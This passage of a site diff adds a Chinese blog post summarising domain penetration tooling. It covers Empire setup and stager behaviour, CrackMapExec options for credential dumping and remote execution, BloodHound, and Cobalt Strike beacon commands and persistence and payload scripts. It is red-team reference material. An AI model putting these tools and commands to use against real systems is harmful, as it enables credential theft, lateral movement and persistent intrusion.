@@ -254,6 +254,388 @@
         
           <section id="main" style="float:none;">
   
+    <article id="post-域渗透实战简单总结"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2018/10/29/域渗透实战简单总结/">域渗透实战简要总结</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/10/29/域渗透实战简单总结/" class="article-date">
+	  <time datetime="2018-10-28T17:03:56.000Z" itemprop="datePublished">2018-10-29</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="域渗透实战简要总结"><a href="#域渗透实战简要总结" class="headerlink" title="域渗透实战简要总结"></a>域渗透实战简要总结</h1><blockquote>
+<p>本文记录域渗透的一些Tip与坑点，感觉内网渗透，只要英语好，一切都不是事情。老外们的技术与分享精神好多干货，学无止境。</p>
+</blockquote>
+<p>不断更新ing~</p>
+<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><blockquote>
+<p><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></p>
+</blockquote>
+<p>​    Empire是基于Powershell后渗透框架，之前NSA的武器库中就有这个神器。我这里的是2.5版本的，提供rest API，有PHP版本和官方node.js版的前端。但这些GUI都不好用，有不少Bug。另外需要注意的是Empire版本问题，版本的命令可以有所差别,官方文档也是更新不及时。</p>
+<p>可参考徐大大的两篇文章，版本是2.3。</p>
+<h5 id="一篇文章精通PowerShell-Empire-2-3（下）"><a href="#一篇文章精通PowerShell-Empire-2-3（下）" class="headerlink" title="一篇文章精通PowerShell Empire 2.3（下）"></a>一篇文章精通PowerShell Empire 2.3（下）</h5><p><a href="https://www.anquanke.com/post/id/87328" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87328</a></p>
+<h5 id="一篇文章精通PowerShell-Empire-2-3（下）-1"><a href="#一篇文章精通PowerShell-Empire-2-3（下）-1" class="headerlink" title="一篇文章精通PowerShell Empire 2.3（下）"></a>一篇文章精通PowerShell Empire 2.3（下）</h5><p><a href="https://www.anquanke.com/post/id/87333" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87333</a></p>
+<p>如下安装命令，官方提供了一键脚本，linux下kali与ubuntu都是支持的。项目原理是类似Metasploit、先建立Listeners，这里话简单看一写它的架构。</p>
+<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/UqKswX6rtV34.png?imageslim" alt="mark"></p>
+<p>​    安装很简单，apt下载些包，pip安装python依赖。自动安装，最后需要设置数据库密码。也可以用data，目录下的rest.sh重置数据库。项目结构很清晰。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/EmpireProject/Empire.git</span><br><span class="line"></span><br><span class="line">cd Empire</span><br><span class="line"></span><br><span class="line">cd setup</span><br><span class="line"></span><br><span class="line">sudo ./install.sh</span><br><span class="line"></span><br><span class="line">python empire --rest --username admin --password password</span><br></pre></td></tr></table></figure>
+<p>启动  开启1337端口，rest api。</p>
+<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/nrz5mH5Ah9Kl.png?imageslim" alt="mark"></p>
+<h5 id="常用命令-直接help"><a href="#常用命令-直接help" class="headerlink" title="常用命令  直接help"></a>常用命令  直接help</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listenters</span><br><span class="line">help</span><br></pre></td></tr></table></figure>
+<p>​    这里的module，分python版和powershell，不用多说啦，powershell只是用在windows平台下面，modules下面的文件只是python入口文件最后调用的还是data文件夹下面的powershell payload。python版的用在，linux与osx下面。大概分为下面几个大类。需要看到的时候在help就可以了。</p>
+<blockquote>
+<p><a href="https://github.com/SadProcessor/Cheats/blob/master/RedTrooperFM.md" target="_blank" rel="noopener">https://github.com/SadProcessor/Cheats/blob/master/RedTrooperFM.md</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">code_execution	代码执行</span><br><span class="line">collection		信息收集</span><br><span class="line">credentials		凭证	</span><br><span class="line">exfiltration	数据窃取</span><br><span class="line">exploitation</span><br><span class="line">lateral_movement 横向</span><br><span class="line">management		管理</span><br><span class="line">persistence		权限维持</span><br><span class="line">privesc		提权</span><br><span class="line">recon		侦查</span><br><span class="line">situational_awareness</span><br><span class="line">trollsploit</span><br></pre></td></tr></table></figure>
+<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/558WMKnNVaYQ.png?imageslim" alt="mark"></p>
+<p>usestager</p>
+<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/zwIq1GaC13ke.png?imageslim" alt="mark"></p>
+<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/IlOV34AFS20x.png?imageslim" alt="mark"></p>
+<p>​    </p>
+<p>​    用Base64解码。看到发送的Python payload，大概的原理是客户端先判断有没有Little Snitch，直接用python2中原生urllib2库请求我们Empire 的http listener，的ip地址端口，这里的listener是由flask提供server，验证客户端来的cookie，相当于模拟正常的web流量。加密混淆建立个长连接。同样Powershell也这个原理。</p>
+<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/59MxERtRsAzf.png?imageslim" alt="mark"></p>
+<p>payload执行后，还要rm。</p>
+<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/wrfQjtc5bam7.png?imageslim" alt="mark"></p>
+<p>客户端执行后，agent上线。</p>
+<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/FobbiBWwAvyX.png?imageslim" alt="mark"></p>
+<p>接下来就可以进行后渗透攻击。</p>
+<h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><blockquote>
+<p><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/CrackMapExec</a></p>
+<p><a href="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/" target="_blank" rel="noopener">https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/</a></p>
+</blockquote>
+<p>作者两篇文章，由于文章早点现在这些命令有些不同。</p>
+<p><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html</a></p>
+<p><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html</a></p>
+<p>这个项目是一些之前的项目的集成、</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Impacket</span><br><span class="line">Pywinrm</span><br><span class="line">Pywerview</span><br><span class="line">PowerSploit</span><br><span class="line">Invoke-Obfuscation</span><br><span class="line">Invoke-Vnc</span><br><span class="line">Mimikittenz</span><br><span class="line">NetRipper</span><br><span class="line">RandomPS-Scripts</span><br><span class="line">SessionGopher</span><br><span class="line">Mimipenguin</span><br></pre></td></tr></table></figure>
+<p>kali 下面一键安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install crackmapexec</span><br></pre></td></tr></table></figure>
+<p>值得注意的是项目的cmedb 命令可以用Empire的 Rest Api</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec	参数：</span><br><span class="line">  target	包含目标列表的目标IP，范围，CIDR（s），主机名，FQDN或文件</span><br><span class="line"></span><br><span class="line">可选参数：</span><br><span class="line">  -h,--help			显示此帮助消息并退出</span><br><span class="line">  -v,--version		显示程序的版本号并退出</span><br><span class="line">  -t 	THREADS		设置要使用的并发线程数（默认值：100）</span><br><span class="line">  -id CRED_ID [CRED_ID ...]		  用于身份验证的数据库凭据ID</span><br><span class="line">  -u USERNAME [USERNAME ...]	   用户名或包含用户名的文件</span><br><span class="line">  -d DOMAIN				域名</span><br><span class="line">  --local-auth在本地验证每个目标</span><br><span class="line">  -p PASSWORD [PASSWORD ...]		 包含密码的密码或文件</span><br><span class="line">  -H HASH [HASH ...] 				NTLM哈希值或包含NTLM哈希值的文件</span><br><span class="line">  -M MODULE， --Module模块				有效负载模块使用</span><br><span class="line">  -o MODULE_OPTION [MODULE_OPTION ...]                  有效载荷模块选项</span><br><span class="line">  -L，--list-modules列出可用模块</span><br><span class="line">  --show-options			显示模块选项</span><br><span class="line">  --share SHARE				指定共享（默认值：C $）</span><br><span class="line">  --smb-port &#123;139,445&#125; 		SMB端口（默认值：445）</span><br><span class="line">  --mssql-port PORT 		MSSQL端口（默认值：1433）</span><br><span class="line">  --server &#123;http，https&#125;  		使用所选服务器（默认值：https）</span><br><span class="line">  --server-host HOST 				IP将服务器绑定到（默认值：0.0.0.0）</span><br><span class="line">  --server-port PORT			在指定端口上启动服务器</span><br><span class="line">  --timeout TIMEOUT			每个线程的最大超时时间（秒）（默认值：20）</span><br><span class="line">  --gfail-limit 			LIMIT全局失败登录尝试的最大数量</span><br><span class="line">  --ufail-limit 			LIMIT每个用户名的最大失败登录尝试次数</span><br><span class="line">  --fail-limit 				LIMIT每个主机的最大失败登录尝试次数</span><br><span class="line">  --verbose启用详细输出</span><br><span class="line"></span><br><span class="line">凭证收集：</span><br><span class="line">  收集凭据的选项</span><br><span class="line"></span><br><span class="line">  --sam Dump来自目标系统的SAM哈希值</span><br><span class="line">  --lsa从目标系统中转储LSA的秘密</span><br><span class="line">  --ntds &#123;vss，drsuapi&#125;使用指定的方法从目标DC转储NTDS.ditdrsuapi是最快的）</span><br><span class="line">  --ntds-history转储NTDS.dit密码历史记录</span><br><span class="line">  --ntds-pwdLastSet显示每个NTDS.dit帐户的pwdLastSet属性</span><br><span class="line">  --wdigest &#123;enable，disable&#125; 创建/删除'UseLogonCredential'注册表项，在Windows上启用WDigest信用转储&gt; = 8.1</span><br><span class="line"></span><br><span class="line">制图/枚举：</span><br><span class="line">  映射/枚举选项</span><br><span class="line"></span><br><span class="line">  --shares枚举共享和访问权限</span><br><span class="line">  --uac检查UAC状态</span><br><span class="line">  --sessions枚举活动会话</span><br><span class="line">  --disks枚举磁盘</span><br><span class="line">  --users枚举用户</span><br><span class="line">  --rid-brute [MAX_RID] 通过强制RID枚举用户（默认值：4000）</span><br><span class="line">  --pass-pol转储密码策略</span><br><span class="line">  --lusers枚举已登录的用户</span><br><span class="line">  --wmi QUERY发出指定的WMI查询</span><br><span class="line">  --wmi-namespace NAMESPACEWMI命名空间（默认值：//./root/cimv2）</span><br><span class="line"></span><br><span class="line">爬虫：</span><br><span class="line">  爬虫的选择</span><br><span class="line"></span><br><span class="line">  --spider [FOLDER]文件夹到蜘蛛（默认：根目录）</span><br><span class="line">  --content启用文件内容搜索</span><br><span class="line">  --exclude-dirs DIR_LIST目录排除蜘蛛</span><br><span class="line">  --pattern PATTERN [PATTERN ...]要在文件夹，文件名和文件内容中搜索的模式</span><br><span class="line">  --regex REGEX [REGEX ...]正则表达式搜索文件夹，文件名和文件内容</span><br><span class="line">  --depth DEPTH Spider递归深度（默认值：10）</span><br><span class="line"></span><br><span class="line">命令执行：</span><br><span class="line">  执行命令的选项</span><br><span class="line"></span><br><span class="line">  --exec-method &#123;smbexec，wmiexec，atexec&#125; 执行命令的方法。在MSSQL模式下忽略（默认值：wmiexec）</span><br><span class="line">  --force-ps32强制PowerShell命令在32位进程中运行</span><br><span class="line">  --no-output不检索命令输出</span><br><span class="line">  -x COMMAND执行指定的命令</span><br><span class="line">  -X PS_COMMAND执行指定的PowerShell命令</span><br><span class="line"></span><br><span class="line">MSSQL交互：</span><br><span class="line">  与MSSQL DB交互的选项</span><br><span class="line">  </span><br><span class="line">  --mssql将crackmapexec切换到MSSQL模式。如果提供凭据，则将对所有发现的MSSQL DB进行身份验证</span><br><span class="line">  --mssql-query QUERY对MSSQL DB执行指定的查询</span><br><span class="line">  --mssql-auth &#123;windows，normal&#125;要使用的MSSQL身份验证类型（默认值：windows）</span><br></pre></td></tr></table></figure>
+<p>主要还是以下这些模块。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] empire_exec		使用Empire的RESTful API为指定的侦听器生成启动器并执行它</span><br><span class="line">[*] mimikittenz		执行Mimikittenz</span><br><span class="line">[*] rundll32_exec	使用rundll32和Windows的本机JavaScript解释器执行命令</span><br><span class="line">[*] shellinject		下载指定的原始shellcode并使用PowerSploit的Invoke-Shellcode.ps1脚本将其注入内存</span><br><span class="line">[*] com_exec		使用COM scriptlet执行命令以绕过白名单</span><br><span class="line">[*] enum_chrome		使用Powersploit的Invoke-Mimikatz.ps1脚本解密已保存的Chrome密码</span><br><span class="line">[*] tokens			使用Powersploit的Invoke-TokenManipulation枚举可用的令牌</span><br><span class="line">[*] mimikatz		执行PowerSploit的Invoke-Mimikatz.ps1脚本</span><br><span class="line">[*] powerview Wrapper for PowerView的功能</span><br><span class="line">[*] peinject		下载指定的DLL/EXE并使用PowerSploit的Invoke-ReflectivePEInjection.ps1脚本将其注入内存</span><br><span class="line">[*] tokenrider		允许使用权限而不是转储凭据进行自动令牌枚举，模拟和大规模横向传播</span><br><span class="line">[*] metinject		下载Meterpreter stager并使用PowerSploit的Invoke-Shellcode.ps1脚本将其注入内存</span><br><span class="line">[*] eventvwr_bypass		使用eventvwr.exe无文件UAC绕过执行命令</span><br></pre></td></tr></table></figure>
+<h3 id="Bloodhound-域攻击关系图"><a href="#Bloodhound-域攻击关系图" class="headerlink" title="Bloodhound  域攻击关系图"></a>Bloodhound  域攻击关系图</h3><blockquote>
+<p><a href="https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collection-Intro" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collection-Intro</a></p>
+<p><a href="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/" target="_blank" rel="noopener">https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/</a></p>
+<p><a href="https://www.youtube.com/watch?v=lxd2rerVsLo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=lxd2rerVsLo</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bloodhound</span><br></pre></td></tr></table></figure>
+<p>基于 Neo4j数据库,需要改密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j console</span><br></pre></td></tr></table></figure>
+<p>在终端上执行,GUI界面，输入数据库的地址、端口用户密码。可以多客户端使用，跨平台。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound</span><br></pre></td></tr></table></figure>
+<h2 id="CobaltStrke"><a href="#CobaltStrke" class="headerlink" title="CobaltStrke"></a>CobaltStrke</h2><blockquote>
+<h5 id="列表集合"><a href="#列表集合" class="headerlink" title="列表集合"></a>列表集合</h5><p><a href="https://github.com/invokethreatguy/CSASC" target="_blank" rel="noopener">https://github.com/invokethreatguy/CSASC</a></p>
+</blockquote>
+<p>Cobalt Strike 的一些好用的插件，可以让我们更加清楚和方便的进行工作。</p>
+<h4 id="Bean-COMMAD"><a href="#Bean-COMMAD" class="headerlink" title="Bean COMMAD"></a>Bean COMMAD</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">EDR_Query		查询所有安装的主要EDR产品的系统</span><br><span class="line">ProcessMonitor	启动/停止并更改进程监视器的间隔时间</span><br><span class="line">RedRepo			一个庞大的命令库和红色团队提示</span><br><span class="line">audit_uac		审核BypassUAC方法成功的主机</span><br><span class="line">browserpivot	设置浏览器数据透视会话</span><br><span class="line">bypassuac		在高完整性过程中生成会话</span><br><span class="line">cancel			取消正在进行的下载</span><br><span class="line">cd				更改目录</span><br><span class="line">check_msbuild	在目标上查找.NET v4.0.30319</span><br><span class="line">checkin			致电主页并发布数据</span><br><span class="line">clear			明确的Bean队列</span><br><span class="line">com-exec		使用DCOM进行横向运动</span><br><span class="line">covertvpn		部署隐蔽VPN客户端</span><br><span class="line">cp				复制文件</span><br><span class="line">dcsync			从DC中提取密码哈希</span><br><span class="line">desktop			桌面查看目标桌面并与之交互</span><br><span class="line">dllinject		将反射DLL注入进程</span><br><span class="line">dllload			使用LoadLibrary（）将DLL加载到进程中</span><br><span class="line">download		下载文件</span><br><span class="line">downloads		列出正在进行的文件下载</span><br><span class="line">drives			列出目标驱动器</span><br><span class="line">elevate			提升尝试提升权限</span><br><span class="line">execute			执行目标执行程序（无输出）</span><br><span class="line">execute-assembly	在目标上执行内存中的本地.NET程序</span><br><span class="line">exit			终止Bean会话</span><br><span class="line">getprivs		启用当前令牌的系统权限</span><br><span class="line">getsystem		尝试获取SYSTEM</span><br><span class="line">getuid			获取用户ID</span><br><span class="line">hashdump		转储密码哈希值</span><br><span class="line">help			帮助菜单</span><br><span class="line">inject			在特定进程中注入一个会话</span><br><span class="line">jobkill			杀死一个长期的后期开发任务</span><br><span class="line">jobs			列出长期运行的后期开发任务</span><br><span class="line">kerberos_ccache_use		将缓存中的kerberos票证应用于此会话</span><br><span class="line">kerberos_ticket_purge	从本次会议中清除kerberos门票</span><br><span class="line">kerberos_ticket_use		将kerberos票证应用于此会话</span><br><span class="line">keylogger		键盘记录器将键击记录器注入进程</span><br><span class="line">kill			杀死一个进程</span><br><span class="line">link			通过SMB连接到Beacon对等端</span><br><span class="line">logonpasswords		使用mimikatz转储凭据和哈希值</span><br><span class="line">ls		列出文件</span><br><span class="line">make_token		创建令牌以传递凭据</span><br><span class="line">mimikatz		运行mimikatz命令</span><br><span class="line">mkdir			制作一个目录</span><br><span class="line">mode dns		使用DNS A作为数据通道（仅限DNSBean）</span><br><span class="line">mode dns-txt		使用DNS TXT作为数据通道（仅限DNSBean）</span><br><span class="line">mode dns6		使用DNS AAAA作为数据通道（仅限DNSBean）</span><br><span class="line">mode http			使用HTTP作为数据通道</span><br><span class="line">mode smb		使用SMB对等通信</span><br><span class="line">mv				移动文件</span><br><span class="line">net				网络和主机枚举工具</span><br><span class="line">note			为此Beacon分配注释</span><br><span class="line">persitence		为Bean添加或删除持久性功能</span><br><span class="line">portscan		扫描网络以获取开放服务</span><br><span class="line">powerpick		通过Unmanaged PowerShell执行命令</span><br><span class="line">powershell		通过powershell.exe执行命令</span><br><span class="line">powershell-import	导入powershell脚本</span><br><span class="line">ppid			为生成的post-ex作业设置父PID</span><br><span class="line">ps				显示进程列表</span><br><span class="line">psexec			使用服务在主机上生成会话</span><br><span class="line">psexec_psh		使用PowerShell在主机上生成会话</span><br><span class="line">psinject		在特定进程中执行PowerShell命令</span><br><span class="line">pth				使用Mimikatz传递哈希</span><br><span class="line">pwd				打印当前目录</span><br><span class="line">reg				查询注册表</span><br><span class="line">rename_msbuild		创建无辜的MSBuild.exe副本</span><br><span class="line">rev2self		恢复原始令牌</span><br><span class="line">rm				删除文件或文件夹</span><br><span class="line">rportfwd		向前设置反向端口</span><br><span class="line">run				在目标上执行程序（返回输出）</span><br><span class="line">runas			以另一个用户身份执行程序</span><br><span class="line">runasadmin		在高完整性上下文中执行程序</span><br><span class="line">runu				在另一个PID下执行程序</span><br><span class="line">screenshot		截取屏幕截图</span><br><span class="line">sendtoempire	将当前Beacon会话发送到已配置的Empire服务器</span><br><span class="line">setenv			设置环境变量</span><br><span class="line">shell			通过cmd.exe执行命令</span><br><span class="line">shinject		将shellcode注入进程</span><br><span class="line">shspawn			生成进程并将shellcode注入其中</span><br><span class="line">sleep			设置Bean睡眠时间</span><br><span class="line">socks			启动SOCKS4a服务器以中继流量</span><br><span class="line">socks stop		停止SOCKS4a服务器</span><br><span class="line">spawn			产生一个会话</span><br><span class="line">spawnto			设置可执行文件以生成进程</span><br><span class="line">spawnu			在另一个PID下产生一个会话</span><br><span class="line">ssh				使用SSH在主机上生成SSH会话</span><br><span class="line">ssh-key			使用SSH在主机上生成SSH会话</span><br><span class="line">steal_token		从进程中窃取访问令牌</span><br><span class="line">timestomp		将时间戳从一个文件应用到另一个文件</span><br><span class="line">type			显示文件的内容</span><br><span class="line">unlink			断开与父Beacon的连接</span><br><span class="line">upload			上传文件</span><br><span class="line">wimgest			使用mimikatz转储明文凭据</span><br><span class="line">winrm			使用WinRM在主机上生成会话</span><br><span class="line">wmi				使用WMI在主机上生成会话</span><br><span class="line">wmi_msbuild 	wmi横向运动没有powershell</span><br></pre></td></tr></table></figure>
+<h4 id="一些好用的脚本"><a href="#一些好用的脚本" class="headerlink" title="一些好用的脚本"></a>一些好用的脚本</h4><blockquote>
+<p>后续有时间再整理整理。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">CertUtilWebDelivery.cna  </span><br><span class="line">Logging                       </span><br><span class="line">PowerLessShell        </span><br><span class="line">ProcessMonitor.ps1  </span><br><span class="line">SMBPayloadGenerator.cna</span><br><span class="line">ArtifactPayloadGenerator.cna </span><br><span class="line">DriverSearcher           </span><br><span class="line">logvis.cna                    </span><br><span class="line">PowerView3-Aggressor  </span><br><span class="line">UACBypass</span><br><span class="line">AVQuery.cna                   </span><br><span class="line">EDR.cna                  </span><br><span class="line">Persistence                   </span><br><span class="line">ProcessColor.cna     </span><br><span class="line">RedTeamRepo.cna     </span><br><span class="line">Beaconpire                    </span><br><span class="line">ElevateKit               </span><br><span class="line">persistence-aggressor-script  </span><br><span class="line">ProcessMonitor.cna    </span><br><span class="line">silver-tickets.cna</span><br></pre></td></tr></table></figure>
+<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/4WR9tTEc46Wr.png?imageslim" alt="mark"></p>
+<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/0nCBot3LSOtW.png?imageslim" alt="mark"></p>
+<ul>
+<li><p>ArtifactPayloadGenerator.cna</p>
+<ul>
+<li>根据HTTP/HTTPS侦听器生成每种类型的无阶段/分阶段有效负载</li>
+<li>创建/opt /cobaltstrike/Staged_Payloads，/opt/cobaltstrike/Stageless_Payloads</li>
+</ul>
+</li>
+<li><p>AVQuery.cna</p>
+<ul>
+<li>使用PowerShell在目标上查询所有安装的AV，以查询注册表</li>
+<li>快速简便地获取您作为攻击者处理的AV</li>
+</ul>
+</li>
+<li><p>CertUtilWebDelivery.cna</p>
+<ul>
+<li>使用CertUtil.exe的无级Web传送</li>
+<li>Powerpick用于生成certutil.exe以下载目标上的无阶段有效负载并使用rundll32.exe执行</li>
+</ul>
+<p><a href="https://user-images.githubusercontent.com/27856212/29992549-12d45854-8f6c-11e7-95c7-c2892582f56f.PNG" target="_blank" rel="noopener"><img src="https://user-images.githubusercontent.com/27856212/29992549-12d45854-8f6c-11e7-95c7-c2892582f56f.PNG" alt="certutil2"></a></p>
+</li>
+<li><p>RedTeamRepo.cna</p>
+<ul>
+<li>一个常见的操作系统命令集合，以及当您手头没有Google或RTFM时的红色团队提示。</li>
+</ul>
+</li>
+<li><p>ProcessColor.cna</p>
+<ul>
+<li>彩色输出</li>
+</ul>
+</li>
+</ul>
+<h4 id="Red-Team-Persistence"><a href="#Red-Team-Persistence" class="headerlink" title="Red Team Persistence"></a><strong>Red Team Persistence</strong></h4><ul>
+<li><p>UserSchtasksPersist.cna</p>
+<ul>
+<li>用户Schtasks作为所选Bean的当前用户运行的持久性</li>
+<li>意味着在初始访问时快速用户级持久性</li>
+</ul>
+<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449039/2b43a742-411e-11e7-8ac4-f003c8060654.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449039/2b43a742-411e-11e7-8ac4-f003c8060654.PNG" alt="的schtasks"></a></p>
+</li>
+<li><p>ServiceEXEPersist.cna</p>
+<ul>
+<li>管理级自定义服务EXE持久性</li>
+<li>作为所选Bean的提升用户/ SYSTEM运行</li>
+</ul>
